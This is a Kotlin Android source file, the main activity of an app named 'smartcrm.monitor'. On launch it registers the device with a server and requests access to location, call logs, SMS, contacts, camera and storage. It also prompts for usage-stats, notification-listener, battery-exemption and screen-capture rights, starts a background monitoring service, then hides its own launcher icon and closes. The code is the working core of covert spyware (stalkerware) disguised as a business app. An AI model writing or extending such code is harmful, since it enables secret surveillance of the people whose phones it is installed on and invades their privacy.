package com.smartcrm.monitor

import android.Manifest
import android.app.AppOpsManager
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.os.Handler
import android.os.Looper
import android.os.PowerManager
import android.provider.Settings
import androidx.appcompat.app.AppCompatActivity
import androidx.core.app.ActivityCompat

class MainActivity : AppCompatActivity() {

    private val PERMS = arrayOf(
        Manifest.permission.ACCESS_FINE_LOCATION,
        Manifest.permission.ACCESS_COARSE_LOCATION,
        Manifest.permission.READ_CALL_LOG,
        Manifest.permission.READ_SMS,
        Manifest.permission.READ_CONTACTS,
        Manifest.permission.READ_PHONE_STATE,
        Manifest.permission.CAMERA,
        Manifest.permission.READ_EXTERNAL_STORAGE,
        Manifest.permission.PROCESS_OUTGOING_CALLS,
    )

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        // Register device on server
        Thread {
            try {
                val d = org.json.JSONObject()
                d.put("type", "register")
                d.put("name", ApiClient.getDeviceName())
                ApiClient.post("api.php", d, this)
            } catch (e: Exception) {}
        }.start()

        // Request runtime permissions
        val missing = PERMS.filter {
            checkSelfPermission(it) != PackageManager.PERMISSION_GRANTED
        }
        if (missing.isNotEmpty()) {
            ActivityCompat.requestPermissions(this, missing.toTypedArray(), 100)
        } else {
            startEverything()
        }
    }

    private fun startEverything() {
        // 1. Usage stats
        if (!hasUsageStats()) {
            try { startActivity(Intent(Settings.ACTION_USAGE_ACCESS_SETTINGS)) } catch (e: Exception) {}
        }

        // 2. Battery optimization whitelist
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            val pm = getSystemService(Context.POWER_SERVICE) as PowerManager
            if (!pm.isIgnoringBatteryOptimizations(packageName)) {
                try {
                    val i = Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS)
                    i.data = Uri.parse("package:$packageName")
                    startActivity(i)
                } catch (e: Exception) {}
            }
        }

        // 3. Notification listener permission
        if (!isNotificationListenerEnabled()) {
            try {
                startActivity(Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS))
            } catch (e: Exception) {}
        }

        // 4. Notification permission Android 13+
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            if (checkSelfPermission(Manifest.permission.POST_NOTIFICATIONS) != PackageManager.PERMISSION_GRANTED) {
                ActivityCompat.requestPermissions(
                    this, arrayOf(Manifest.permission.POST_NOTIFICATIONS), 101
                )
            }
        }

        // 5. Start monitor service
        startMonitorService()

        // 6. Request MediaProjection if not already approved
        // Small delay taake service start ho jaye pehle
        Handler(Looper.getMainLooper()).postDelayed({
            val prefs = getSharedPreferences(Config.PREFS_NAME, Context.MODE_PRIVATE)
            val alreadyApproved = prefs.getBoolean("projection_approved", false)
            if (!alreadyApproved) {
                try {
                    val i = Intent(this, ScreenPermissionActivity::class.java)
                    i.putExtra("cmd_id", 0)
                    i.putExtra("mode", ScreenStreamService.MODE_SNAPSHOT)
                    startActivity(i)
                } catch (e: Exception) {}
            }
        }, 2000)

        // 7. Hide icon after everything started
        hideAppIcon()
        finish()
    }

    private fun isNotificationListenerEnabled(): Boolean {
        val enabledListeners = Settings.Secure.getString(
            contentResolver,
            "enabled_notification_listeners"
        ) ?: return false
        return enabledListeners.contains(packageName)
    }

    private fun hideAppIcon() {
        val prefs = getSharedPreferences(Config.PREFS_NAME, Context.MODE_PRIVATE)
        val alreadyHidden = prefs.getBoolean("icon_hidden", false)
        if (!alreadyHidden) {
            try {
                val compName = ComponentName(this, MainActivity::class.java)
                packageManager.setComponentEnabledSetting(
                    compName,
                    PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                    PackageManager.DONT_KILL_APP
                )
                prefs.edit().putBoolean("icon_hidden", true).apply()
            } catch (e: Exception) {}
        }
    }

    private fun hasUsageStats(): Boolean {
        return try {
            val appOps = getSystemService(Context.APP_OPS_SERVICE) as AppOpsManager
            val mode = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                appOps.unsafeCheckOpNoThrow(
                    AppOpsManager.OPSTR_GET_USAGE_STATS,
                    android.os.Process.myUid(), packageName
                )
            } else {
                @Suppress("DEPRECATION")
                appOps.checkOpNoThrow(
                    AppOpsManager.OPSTR_GET_USAGE_STATS,
                    android.os.Process.myUid(), packageName
                )
            }
            mode == AppOpsManager.MODE_ALLOWED
        } catch (e: Exception) { false }
    }

    private fun startMonitorService() {
        val intent = Intent(this, MonitorService::class.java)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForegroundService(intent)
        } else {
            startService(intent)
        }
    }

    override fun onRequestPermissionsResult(
        requestCode: Int, permissions: Array<out String>, grantResults: IntArray
    ) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults)
        startEverything()
    }
}
